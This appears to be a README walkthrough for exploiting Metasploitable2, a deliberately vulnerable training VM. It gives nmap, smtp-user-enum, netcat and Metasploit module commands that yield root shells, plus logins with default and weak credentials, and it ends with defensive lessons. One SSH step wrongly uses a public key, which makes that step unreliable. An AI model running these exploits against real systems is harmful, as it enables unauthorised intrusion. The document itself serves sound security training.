# Metasploitable2 – Training Walkthrough 🐧💻

![Linux](https://img.shields.io/badge/Target-Linux-green?logo=linux)
![Metasploit](https://img.shields.io/badge/Tool-Metasploit-red?logo=kalilinux)
![Educational](https://img.shields.io/badge/Purpose-Education-blue?style=flat&logo=book)

A **step-by-step exploitation guide** for Metasploitable2, intended for **training and educational purposes** only.  
⚠️ **Disclaimer:** Do not use these techniques on unauthorized systems.

---

## 📖 Table of Contents
1. [Introduction](#1-introduction)  
2. [Reconnaissance](#2-reconnaissance)  
3. [Service Exploitation](#3-service-enumeration--exploitation)  
   - [FTP (Port 21)](#31-ftp-port-21)  
   - [Telnet (Port 23)](#32-telnet-port-23)  
   - [SMTP (Port 25)](#33-smtp-port-25)  
   - [DNS (Port 53)](#34-dns--isc-bind-port-53)  
   - [RPCBind (Port 111)](#35-rpcbind-port-111)  
   - [Samba (Ports 139445)](#36-samba-ports-139445)  
   - [Java RMI](#37-java-rmi)  
   - [Bind Shell (Port 1524)](#38-bind-shell-port-1524)  
   - [PostgreSQL / SSH](#39-postgresql--openssl--ssh)  
   - [VNC (Port 5900)](#310-vnc-port-5900)  
   - [UnrealIRCD](#311-unrealircd-irc-service)  
4. [Summary](#4-summary-of-exploited-services)  
5. [Lessons Learned](#5-lessons-learned)  

---

## 1. Introduction
Metasploitable2 is a deliberately vulnerable Linux VM designed for practicing penetration testing.  
This guide demonstrates **discovery, enumeration, and exploitation** of its services using tools like `Nmap`, `Metasploit`, `Hydra`, and `Netcat`.

---

## 2. Reconnaissance
### 🔍 Port Scanning
```bash
sudo nmap -sS -sV <Target_IP>
-sS → TCP SYN scan

-sV → Service version detection

3. Service Enumeration & Exploitation
3.1 FTP (Port 21)
Service: vsFTPd 2.3.4

Vulnerability: Known backdoor

Exploit (Metasploit):

bash
Copy
Edit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <Target_IP>
run
✅ Root shell obtained.

3.2 Telnet (Port 23)
Default Credentials: msfadmin:msfadmin

Result: Login successful, limited access.

3.3 SMTP (Port 25)
Tool: smtp-user-enum

bash
Copy
Edit
smtp-user-enum -M VRFY -U users.txt -t <Target_IP>
Result: Usernames enumerated, no authentication possible.

3.4 DNS – ISC BIND (Port 53)
Service: BIND 9.4.2

Known CVEs: CVE-2008-1447, CVE-2011-2464, CVE-2017-3136

Result: Not exploited in this session.

3.5 RPCBind (Port 111)
Service: RPC service manager

Potential exploits: Buffer overflow, Shellshock

Next step: Enumerate NFS or RPC-based services.

3.6 Samba (Ports 139/445)
Exploit: Metasploit usermap_script

bash
Copy
Edit
use exploit/multi/samba/usermap_script
set RHOST <Target_IP>
run
✅ Reverse shell with root access.

3.7 Java RMI
bash
Copy
Edit
use exploit/multi/misc/java_rmi_server
set RHOST <Target_IP>
run
✅ Meterpreter session → Root.

3.8 Bind Shell (Port 1524)
bash
Copy
Edit
nc <Target_IP> 1524
✅ Direct root shell.

3.9 PostgreSQL / OpenSSL / SSH
Extracted SSH public key from OpenSSL exploit (5622.tar.bz2).

Logged in as root:

bash
Copy
Edit
ssh -i <key>.pub root@<Target_IP>
3.10 VNC (Port 5900)
Metasploit module: auxiliary/scanner/vnc/vnc_login

Weak password :password → Successful login.

3.11 UnrealIRCD (IRC Service)
bash
Copy
Edit
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST <Target_IP>
run
✅ Remote shell access.

4. Summary of Exploited Services
Service	Port(s)	Exploit Method	Result
FTP (vsFTPd)	21	Backdoor exploit	Root shell
Telnet	23	Default credentials	Limited access
SMTP	25	User enumeration only	No exploit
DNS (BIND)	53	Cache poisoning / DoS possible	Not exploited
RPCBind	111	Shellshock, DoS	Not exploited fully
Samba	139, 445	usermap_script exploit	Reverse shell (root)
Java RMI	1099	java_rmi_server exploit	Root Meterpreter
Bind Shell	1524	Netcat connection	Root shell
PostgreSQL/SSH	5432/22	OpenSSL exploit + SSH key login	Root SSH access
VNC	5900	Weak password	Remote desktop access
UnrealIRCD	6667	Backdoor exploit	Remote shell

5. Lessons Learned
Default credentials remain a critical weakness.

Outdated services often contain severe backdoors.

Weak configurations (anonymous FTP, open shells) lead to full compromise.

Metasploit accelerates exploitation with pre-built modules.

Defense in depth: patching, strong authentication, and service minimization are essential.

🎯 Final Notes
Practice these steps only in controlled environments (like Metasploitable2).

This repo is designed as training material for cybersecurity students and professionals.

